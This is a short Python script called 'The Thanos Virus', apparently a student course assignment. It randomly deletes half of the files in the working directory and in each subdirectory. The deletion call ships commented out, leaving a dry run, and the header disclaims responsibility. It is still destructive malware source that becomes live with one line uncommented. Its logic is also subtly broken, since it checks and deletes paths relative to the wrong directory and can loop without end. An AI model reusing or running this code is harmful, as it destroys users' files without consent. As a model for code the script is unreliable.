#!/usr/bin/python

#Title:  The Thanos Virus
#Author: Jason Kaip
#CIS 458(01)

#Description: This program deletes half of the files in the directory it is ran in and
#then in each subdirectory.

#Disclaimer: I do not take responsibility for any damages caused by this program. This was
#made for strictly educational purposes. Use with caution.

#Important: The statement that deletes the files is commented out at first for safety.
#Uncomment the statement if you wish to run the full program- otherwise, the program will
#only print out what files it would have deleted.

import os, random

#Subdirectory names are put into an array.
directnames = [name for name in os.listdir('.') if os.path.isdir(name)]
direct = len(directnames)

#This method performs a Thanos snap (deletes half of the files) in the directory specified.
def snapFiles(directory):
	#File names are put into an array.
	filenames = [name for name in os.listdir(directory) if os.path.isfile(name)]
	files = len(filenames)

	#While loop deletes one file at a time until half remain.
	half = files/2
	while half > 0:
		#Randomly chooses file
		ran = random.randint(0,files-1)
		#If statement prevents Thanos from deleting itself
		if filenames[ran] != "thanos.py":
			if os.path.exists(filenames[ran]):
				print "Removing: " + filenames[ran]
				
				#Uncomment the line below if you wish to delete your files
				#os.remove(filenames[ran])
				
				half = half-1
	print "Removed half of files from folder: " + directory

#Thanos snap is performed on main directory and then subdirectories
snapFiles('.')
for d in directnames:
	if d != ".git":
		snapFiles(d)
